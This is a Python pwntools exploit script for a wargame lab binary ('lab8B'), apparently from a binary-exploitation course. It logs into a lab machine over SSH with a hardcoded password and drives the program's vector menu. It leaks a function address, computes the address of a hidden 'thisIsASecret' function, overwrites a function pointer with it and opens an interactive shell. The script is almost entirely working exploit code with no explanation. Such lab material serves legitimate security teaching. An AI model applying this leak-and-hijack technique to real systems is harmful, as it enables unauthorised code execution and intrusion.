#!/usr/bin/env python3
from time import sleep
from pwn import *
exe = ELF("./lab8B_patched")
context.binary = exe
#context.log_level='debug'
#p=exe.process()
#gdb.attach(p)
s=ssh(host='192.168.1.20',port=22,user='lab8B',password='3v3ryth1ng_Is_@_F1l3')
p=s.run("/levels/lab08/lab8B")
#p.recv()
#p.sendline(b"r")
p.recv()
#create vector1
p.sendline(b"1")
p.recv()
sleep(1)
p.sendline(b'1')
p.recv()
sleep(1)
for i in range(5):
    p.sendline(b'1')
    p.recv()
    sleep(1)
p.sendline(b"1")#v1.e=1
p.recv()
sleep(1)
for i in range(3):
    p.sendline(b'1')
    p.recv()
    sleep(1)
#leak
p.sendline(b"3")
p.recv()
p.sendline(b"1")
p.recvuntil(b"void printFunc: ")
leak=p.recvuntil(b'\n').decode().rstrip()
p.recv()
log.info(f"leak: {leak}")
thisIsASecret=exe.sym['thisIsASecret']-exe.sym['printVector']+int(leak[2:],16)
log.info(f"thisIsASecret: {hex(thisIsASecret)}")
#create vector2
p.sendline(b"1")
p.recv()
sleep(1)
p.sendline(b'2')
p.recv()
sleep(1)
for i in range(4):
    p.sendline(b'1')
    p.recv()
    sleep(1)
p.sendline(str(thisIsASecret).encode())#v2.e=thisIsASecret
p.recv()
sleep(1)
for i in range(4):
    p.sendline(b'1')
    p.recv()
    sleep(1)
#sum
p.sendline(b"2")
p.recv()
for i in range(5):
    p.sendline(b"4")
    p.recv()
#load v3->v1
p.sendline(b"6")
p.sendline(b"4")
p.sendline(b"1")
#print1
p.sendline(b"3")
p.sendline(b"1")
p.recv()
p.interactive()
